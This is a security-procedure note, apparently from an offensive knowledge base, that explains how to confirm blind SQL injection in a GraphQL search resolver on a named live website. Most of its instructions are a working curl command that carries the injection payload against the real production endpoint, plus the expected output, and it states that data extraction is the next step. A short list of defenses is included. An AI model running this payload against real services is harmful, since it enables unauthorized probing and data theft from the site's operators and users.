---
id: proc-uuid-003
tags:
  - sqli
  - blind-sqli
  - false-payload
type: procedure
tools:
  - '[[tools/Chrome]]'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-graphql-cve-query]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:04.995Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Test-SQL-Injection-with-False-Payload

## Summary

This procedure tests SQL injection by using a false-evaluating payload, confirming control when no results are returned.

## Description

The vulnerability allows payloads like /**/AND/**/'1%'='0 to falsify the SQL condition in the ILIKE clause, preventing results. This validates blind injection in the GraphQL resolver, paving the way for time-based or conditional data extraction from the cache.

## Requirements

1. Successful true payload test
2. Valid search term for comparison
3. Tool for query submission

## Defense

Defensive measures and detection strategies:

- Escape or reject SQL comment sequences (/**/) in inputs
- Implement query whitelisting for search parameters
- Anomaly detection on result count discrepancies

## Objectives

1. Inject false condition to suppress results
2. Confirm injection by absence of expected results
3. Demonstrate query manipulation capability

## Instructions

### Step 1: Enter False Payload

**Context**: Append false payload to alter query to return no matches.

Execute [[commands/curl-graphql-cve-query]] with search set to "validterm /**/AND/**/'1%'='0":

```bash
curl 'https://hackerone.com/graphql' -H 'Accept-Language: en-US,en;q=0.9' -H 'Connection: keep-alive' --data-raw '{"operationName":"CveDataQuery","variables":{"first":25,"offset":0,"search":"validterm /**/AND/**/\'1%\'=\'0"},"query":"query CveDataQuery($first: Int, $after: String, $last: Int, $before: String, $search: String, $offset: Int) {\n ranked_cve_entries(\n first: $first\n after: $after\n last: $last\n before: $before\n search: $search\n offset: $offset\n ) {\n total_count\n pageInfo {\n hasNextPage\n endCursor\n hasPreviousPage\n startCursor\n __typename\n }\n edges {\n node {\n id\n cve_id\n cve_description\n rank\n reports_submitted_count\n __typename\n }\n __typename\n }\n __typename\n }\n}\n"}' --compressed
```

> Expected output: JSON with total_count = 0 and empty edges, confirming false injection.

### Step 2: Compare with Normal Search

**Context**: Run without payload to ensure base term works.

Submit plain "validterm".

> Success if normal returns results but false does not.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-graphql-cve-query]]

## Tools Used

- [[tools/Chrome]]

## Tags

- sqli
- blind-sqli
- false-payload
